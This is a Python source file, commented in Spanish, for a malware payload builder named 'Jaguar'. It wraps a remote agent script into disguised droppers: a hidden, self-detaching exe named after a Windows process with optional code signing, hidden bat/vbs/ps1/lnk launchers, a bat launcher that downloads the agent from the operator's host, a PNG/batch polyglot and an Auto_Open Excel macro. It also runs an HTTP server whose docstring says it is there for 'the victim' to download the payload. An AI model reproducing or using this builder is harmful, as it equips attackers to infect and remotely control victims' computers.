# -*- coding: utf-8 -*-
"""Constructor de payloads Jaguar.

Los payloads lanzan agente.py y SE CIERRAN. El .exe se auto-desprende
(spawn detached + exit) para no quedar abierto. Logging por self.log.
"""
import os
import sys
import shutil
import struct
import zlib
import subprocess
import tempfile
import functools
import time                      # <-- AÑADIR
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

ES_WIN = sys.platform.startswith("win")


class Constructor:
    def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
                 icono=None, upx=None, certificado=None, contrasena_cert=None):
        self.host = (host or "127.0.0.1").strip()
        self.puerto = str(puerto or "8000").strip()
        self.log = log or (lambda t: None)
        self.nombre = (nombre or "RuntimeBroker").strip()
        self.icono = icono or None
        self.upx = upx or None
        self.certificado = certificado or None
        self.contrasena_cert = contrasena_cert or None

        self.base = os.path.dirname(os.path.abspath(__file__))
        self.raiz = os.path.dirname(os.path.dirname(self.base))
        self.dist = os.path.join(self.raiz, "dist")
        self.build = os.path.join(self.raiz, "build_jaguar")
        self.agente = self._localizar_agente()
        self.fallback = self._ip_local()        # <-- AÑADIR
        if not self.agente:
            raise FileNotFoundError("No se encontró agente/agente.py — revisa la estructura del proyecto")
        os.makedirs(self.dist, exist_ok=True)

    # ------------------------------------------------------------------ util
    def _localizar_agente(self):
        cands = [
            os.path.join(self.raiz, "agente", "agente.py"),          # estructura real
            os.path.join(self.raiz, "agente.py"),
            os.path.join(self.raiz, "jaguar", "agente", "agente.py"),
            os.path.join(self.base, "agente.py"),
        ]
        for c in cands:
            if os.path.isfile(c):
                self.log(f"[builder] agente.py encontrado en: {c}")
                return c
        self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
        return None


    @staticmethod
    def _ip_local():
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return ""
        finally:
            s.close()

    def _out(self, nombre):
        return os.path.join(self.dist, nombre)

    def _escribir(self, ruta, texto, binario=False):
        modo = "wb" if binario else "w"
        kwargs = {} if binario else {"encoding": "utf-8", "newline": ""}
        with open(ruta, modo, **kwargs) as f:
            f.write(texto)
        self.log(f"[builder] creado: {os.path.basename(ruta)}")
        return ruta

    def _copiar_agente(self):
        try:
            if os.path.isfile(self.agente):
                shutil.copy2(self.agente, self._out("agente.py"))
        except Exception as e:
            self.log(f"[builder] no pude copiar agente.py: {e}")

    def _args(self):
        return f'{self.host} {self.puerto} {self.fallback}'

    # ------------------------------------------------------------------ exe
    def generar_exe(self):
        try:
            if not self.agente or not os.path.isfile(self.agente):
                self.log("[builder] ERROR exe: falta agente.py")
                return None
            os.makedirs(self.build, exist_ok=True)
            shutil.copy2(self.agente, os.path.join(self.build, "agente_jaguar.py"))

            # Compilamos en carpeta TEMPORAL para no chocar con un .exe en uso.
            dist_tmp = os.path.join(self.build, "dist_tmp")
            shutil.rmtree(dist_tmp, ignore_errors=True)
            os.makedirs(dist_tmp, exist_ok=True)

            entry = (
                "import os, sys, subprocess\n"
                "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
                f'_HOST = {self.host!r}\n'
                f'_PORT = {self.puerto!r}\n'
                f'_HOST2 = {self.fallback!r}\n'                 # <-- AÑADIR
                "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
                "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
                "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"   # <-- AÑADIR
                f'_PORT = {self.puerto!r}\n'
                "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
                "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
                "DETACHED_PROCESS = 0x00000008\n"
                "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
                "CREATE_NO_WINDOW = 0x08000000\n"
                "if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
                "    subprocess.Popen(\n"
                "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
                "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,\n"
                "        close_fds=True)\n"
                "    sys.exit(0)\n"
                "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
                "import agente_jaguar as agente\n"
                "agente.main()\n"
            )
            self._escribir(os.path.join(self.build, "_entry.py"), entry)

            cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
                   "--onefile", "--noconsole", "--clean",
                   "--name", self.nombre,
                   "--distpath", dist_tmp,
                   "--workpath", os.path.join(self.build, "work"),
                   "--specpath", self.build,
                   "--hidden-import", "PIL",
                   "--hidden-import", "PIL.Image",
                   "--hidden-import", "PIL.ImageGrab",
                   "--hidden-import", "cv2",
                   "--hidden-import", "winreg",
                   "--paths", self.build]
            if self.icono and os.path.isfile(self.icono):
                cmd += ["--icon", os.path.abspath(self.icono)]
            if self.upx and os.path.isdir(self.upx):
                cmd += ["--upx-dir", os.path.abspath(self.upx)]
            cmd += ["_entry.py"]

            self.log("[builder] compilando exe (PyInstaller)... puede tardar.")
            proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True)
            if proc.returncode != 0:
                self.log("[builder] ERROR PyInstaller:\n" + (proc.stderr or "")[-1500:])
                return None

            origen = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
            if not os.path.isfile(origen):
                self.log("[builder] ERROR exe: PyInstaller no produjo salida")
                return None
            destino = self._colocar_exe(origen)
            self._firmar(destino)
            self.log(f"[builder] exe listo: {os.path.basename(destino)}")
            return destino
        except Exception as e:
            self.log(f"[builder] ERROR exe: {e}")
            return None

    def _colocar_exe(self, origen, intentos=5):
        """Mueve el exe a dist/ aunque el anterior esté en uso (locked)."""
        ext = ".exe" if ES_WIN else ""
        for i in range(intentos):
            nombre = self.nombre + (ext if i == 0 else f"_{i + 1}{ext}")
            destino = os.path.join(self.dist, nombre)
            try:
                if os.path.isfile(destino):
                    try:
                        os.replace(origen, destino)
                    except PermissionError:
                        try:
                            os.remove(destino + ".old")
                        except OSError:
                            pass
                        os.rename(destino, destino + ".old")
                        os.replace(origen, destino)
                else:
                    os.replace(origen, destino)
                return destino
            except (PermissionError, OSError):
                continue
        destino = os.path.join(self.dist, f"{self.nombre}_{int(time.time())}{ext}")
        shutil.copy2(origen, destino)
        return destino
    
    def _firmar(self, exe):
        if not (ES_WIN and self.certificado and os.path.isfile(self.certificado)):
            return
        if not shutil.which("signtool"):
            self.log("[builder] signtool no encontrado, salto firma")
            return
        cmd = ["signtool", "sign", "/f", os.path.abspath(self.certificado),
               "/fd", "SHA256", "/tr", "http://timestamp.digicert.com", "/td", "SHA256"]
        if self.contrasena_cert:
            cmd += ["/p", self.contrasena_cert]
        cmd += [exe]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True)
            self.log("[builder] firmado OK" if r.returncode == 0
                     else "[builder] firma falló: " + (r.stderr or "")[-400:])
        except Exception as e:
            self.log(f"[builder] ERROR firma: {e}")

    # ------------------------------------------------------------------ bat
    def generar_bat(self):
        self._copiar_agente()
        bat = (
            "@echo off\r\n"
            'cd /d "%~dp0"\r\n'
            'if not exist "agente.py" (\r\n'
            '  powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing '
            f"'http://{self.host}:8080/agente.py' -OutFile 'agente.py'}}catch{{}}\"\r\n"
            ')\r\n'
            f'start "" pythonw "agente.py" {self._args()}\r\n'
            "exit\r\n"
        )
        return self._escribir(self._out(self.nombre + ".bat"), bat)

    # ------------------------------------------------------------------ vbs
    def generar_vbs(self):
        self._copiar_agente()
        vbs = (
            'Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
            'dir = fso.GetParentFolderName(WScript.ScriptFullName)\r\n'
            'Set sh = CreateObject("WScript.Shell")\r\n'
            'sh.CurrentDirectory = dir\r\n'
            f'sh.Run "pythonw """ & dir & "\\agente.py"" {self._args()}", 0, False\r\n'
        )
        return self._escribir(self._out(self.nombre + ".vbs"), vbs)

    # ------------------------------------------------------------------ ps1
    def generar_ps1(self):
        self._copiar_agente()
        ps1 = (
            '$dir = Split-Path -Parent $MyInvocation.MyCommand.Path\r\n'
            'Set-Location $dir\r\n'
            f'Start-Process -WindowStyle Hidden -FilePath pythonw '
            f'-ArgumentList \'"agente.py" {self._args()}\' -WorkingDirectory $dir\r\n'
        )
        return self._escribir(self._out(self.nombre + ".ps1"), ps1)

    # ------------------------------------------------------------------ lnk
    def generar_lnk(self):
        self._copiar_agente()
        destino = self._out(self.nombre + ".lnk")
        carpeta = self.dist
        try:
            import win32com.client  # type: ignore
            sh = win32com.client.Dispatch("WScript.Shell")
            lnk = sh.CreateShortCut(destino)
            lnk.TargetPath = "pythonw.exe"
            lnk.Arguments = f'"agente.py" {self._args()}'
            lnk.WorkingDirectory = carpeta
            lnk.WindowStyle = 7
            lnk.Save()
            self.log(f"[builder] creado: {os.path.basename(destino)}")
            return destino
        except Exception:
            pass
        if not (ES_WIN and shutil.which("cscript")):
            self.log("[builder] lnk: sin pywin32 ni cscript, genero .url como respaldo")
            return self._escribir(self._out(self.nombre + ".url"),
                                  f"[InternetShortcut]\nURL=file:///{self.agente}\n")
        vbs = os.path.join(tempfile.gettempdir(), "jaguar_lnk.vbs")
        contenido = (
            'Set sh = CreateObject("WScript.Shell")\r\n'
            f'Set l = sh.CreateShortcut("{destino}")\r\n'
            'l.TargetPath = "pythonw.exe"\r\n'
            f'l.Arguments = """agente.py"" {self._args()}"\r\n'
            f'l.WorkingDirectory = "{carpeta}"\r\n'
            'l.WindowStyle = 7\r\n'
            'l.Save\r\n'
        )
        with open(vbs, "w", encoding="utf-8") as f:
            f.write(contenido)
        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True)
        self.log(f"[builder] creado: {os.path.basename(destino)}")
        return destino

    # ------------------------------------------------------------------ png polyglot
    def generar_png_polyglot(self):
        self._copiar_agente()
        png = self._png_minimo()
        bat = ("\r\n@echo off\r\n"
               'cd /d "%~dp0"\r\n'
               f'start "" pythonw "agente.py" {self._args()}\r\n').encode("utf-8")
        self._escribir(self._out(self.nombre + ".png"), png + bat, binario=True)
        self._escribir(self._out(self.nombre + ".png.cmd"), png + bat, binario=True)
        return self._out(self.nombre + ".png")

    @staticmethod
    def _png_minimo():
        def chunk(tipo, data):
            return (struct.pack(">I", len(data)) + tipo + data +
                    struct.pack(">I", zlib.crc32(tipo + data) & 0xffffffff))
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        idat = zlib.compress(b"\x00\xff\x00\x00")
        return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")

    # ------------------------------------------------------------------ pdf
    # ------------------------------------------------------------------ pdf
    def generar_pdf(self):
        self._escribir(self._out(self.nombre + ".pdf"), self._pdf_minimo(""), binario=True)
        return self._out(self.nombre + ".pdf")

    @staticmethod
    def _pdf_minimo(texto):
        objs = [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 320 120] "
            b"/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
            None,
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>",
        ]
        stream = b"BT /F1 10 Tf 12 60 Td (" + texto.encode("latin-1", "replace") + b") Tj ET"
        objs[3] = (b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" +
                   stream + b"\nendstream")
        out = bytearray(b"%PDF-1.4\n")
        offsets = []
        for i, o in enumerate(objs, 1):
            offsets.append(len(out))
            out += str(i).encode() + b" 0 obj\n" + o + b"\nendobj\n"
        xref = len(out)
        out += b"xref\n0 " + str(len(objs) + 1).encode() + b"\n0000000000 65535 f \n"
        for off in offsets:
            out += ("%010d 00000 n \n" % off).encode()
        out += (b"trailer\n<< /Size " + str(len(objs) + 1).encode() +
                b" /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF")
        return bytes(out)

    # ------------------------------------------------------------------ macro
   # ------------------------------------------------------------------ macro
    def generar_macro(self):
        self._copiar_agente()
        macro = (
            'Sub Auto_Open()\r\n'
            '    Dim sh As Object, dir As String\r\n'
            '    Set sh = CreateObject("WScript.Shell")\r\n'
            '    dir = ThisWorkbook.Path\r\n'
            f'    sh.CurrentDirectory = dir\r\n'
            f'    sh.Run "pythonw ""agente.py"" {self._args()}", 0, False\r\n'
            'End Sub\r\n'
        )
        return self._escribir(self._out(self.nombre + "_macro.bas"), macro)

    # ------------------------------------------------------------------ todo
    def generar_todo(self, tipos=None):
        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "png", "pdf", "macro"]
        res = {}
        mapa = {
            "exe": self.generar_exe,
            "bat": self.generar_bat,
            "vbs": self.generar_vbs,
            "ps1": self.generar_ps1,
            "lnk": self.generar_lnk,
            "png": self.generar_png_polyglot,
            "pdf": self.generar_pdf,
            "macro": self.generar_macro,
        }
        for t in tipos:
            fn = mapa.get(t)
            if not fn:
                continue
            try:
                res[t] = fn()
            except Exception as e:
                self.log(f"[builder] ERROR generando {t}: {e}")
                res[t] = None
        return res


# ============================================================ SERVIDOR ======
class _Handler(SimpleHTTPRequestHandler):
    def __init__(self, *a, directorio=None, **kw):
        super().__init__(*a, directory=directorio, **kw)

    def log_message(self, *a):
        pass


class Servidor:
    """Sirve la carpeta dist para que la víctima descargue el payload por HTTP."""

    def __init__(self, puerto=8080, log=None):
        self.puerto = int(puerto)
        self.log = log or (lambda t: None)
        self.httpd = None
        self.hilo = None

    def iniciar(self, directorio):
        self.detener()
        handler = functools.partial(_Handler, directorio=directorio)
        self.httpd = ThreadingHTTPServer(("0.0.0.0", self.puerto), handler)
        self.hilo = __import__("threading").Thread(target=self.httpd.serve_forever, daemon=True)
        self.hilo.start()
        self.log(f"[servidor] sirviendo {directorio} en http://0.0.0.0:{self.puerto}")
        return f"http://0.0.0.0:{self.puerto}"

    def detener(self):
        try:
            if self.httpd:
                self.httpd.shutdown()
                self.httpd.server_close()
        except Exception:
            pass
        self.httpd = None
        self.hilo = None